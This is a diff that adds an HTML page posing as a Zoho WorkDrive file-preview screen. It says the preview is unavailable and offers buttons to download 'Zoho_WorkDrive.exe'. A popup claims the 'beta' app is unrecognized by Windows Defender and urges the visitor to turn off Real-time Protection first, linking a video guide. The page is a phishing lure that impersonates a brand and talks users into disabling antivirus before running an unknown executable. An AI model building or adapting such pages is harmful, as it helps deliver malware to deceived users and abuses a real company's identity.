@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Zoho WorkDrive</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f4f6f9;
+      font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #2c3e50;
+    }
+    .container {
+      text-align: center;
+      max-width: 420px;
+      background-color: #fff;
+      padding: 30px 25px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+    .icon {
+      margin-bottom: 20px;
+    }
+    .icon img {
+      width: 130px;
+      height: 130px;
+    }
+    .message {
+      font-size: 16px;
+      line-height: 1.5;
+      margin-bottom: 25px;
+    }
+    .message strong {
+      display: block;
+      margin-bottom: 6px;
+    }
+    .button {
+      display: block;
+      width: 50%;
+      min-width: 130px;
+      margin: 12px auto;
+      padding: 12px 0;
+      font-size: 15px;
+      color: #fff;
+      background-color: #28a745;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      text-align: center;
+      text-decoration: none;
+      transition: background-color 0.3s ease;
+    }
+    .button:hover {
+      background-color: #218838;
+    }
+    #popup {
+      display: none;
+      position: fixed;
+      top: 30%;
+      left: 50%;
+      transform: translate(-50%, -30%);
+      background-color: #fff;
+      border: 1px solid #ccc;
+      padding: 28px 22px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      z-index: 10;
+      width: 370px;
+      text-align: center;
+      border-radius: 8px;
+    }
+    #popup-message {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 18px;
+    }
+    #popup .important-note {
+      color: #d9534f;
+      font-weight: 600;
+      margin: 14px 0 10px 0;
+      font-size: 15px;
+      display: block;
+    }
+    #popup .info-box {
+      background: #f8f9fa;
+      border-radius: 6px;
+      padding: 11px 13px;
+      font-size: 15px;
+      color: #223345;
+      margin-bottom: 14px;
+      margin-top: 8px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+    }
+    #popup .button.cancel {
+      background-color: #6c757d;
+    }
+    #popup .button.cancel:hover {
+      background-color: #5a6268;
+    }
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.3);
+      z-index: 5;
+      display: none;
+    }
+    .support {
+      margin-top: 10px;
+      font-size: 13px;
+      color: #2c3e50;
+    }
+    .video-link {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    .reminder {
+      font-size: 13px;
+      color: #555;
+      margin-top: 7px;
+      text-align: left;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="icon">
+      <img src="https://static.zohocdn.com/personal/stable/jsapps/static-resources/dist/assets/static/preview/images/not_available-b860c4e52604e1c68c50e88f874def23.svg" alt="File icon" />
+    </div>
+    <div class="message">
+      <strong></strong>
+      <strong>Preview Unavailable</strong>
+      <span>Install the Zoho WorkDrive app to view or download this file.</span>
+    </div>
+    <button class="button" onclick="showPopup()">Preview</button>
+    <a href="Zoho_WorkDrive.exe" class="button">Install Zoho WorkDrive</a>
+  </div>
+  <div class="overlay" id="overlay"></div>
+  <div id="popup">
+    <div id="popup-message">
+      <div class="info-box">
+        This beta version of our app is new and not yet recognized by Windows Defender.<br>
+      </div>
+         <span class="important-note">
+        Action Required: Please temporarily turn off Windows Real-time Protection before downloading or installing this application.
+      </span>
+      <div class="video-link">
+        <a href="https://www.youtube.com/watch?v=o0OTed9c_GQ" target="_blank">
+          Learn how to turn off Real-time Protection (video guide)
+        </a>
+      </div>
+      <div class="reminder">
+      </div>
+    </div>
+    <a href="Zoho_WorkDrive.exe" class="button">Install Now</a>
+    <button class="button cancel" onclick="hidePopup()">Cancel</button>
+    <div class="support">
+      
+    </div>
+  </div>
+  <script>
+    function showPopup() {
+      document.getElementById('popup').style.display = 'block';
+      document.getElementById('overlay').style.display = 'block';
+    }
+    function hidePopup() {
+      document.getElementById('popup').style.display = 'none';
+      document.getElementById('overlay').style.display = 'none';
+    }
+  </script>
+</body>
+</html>
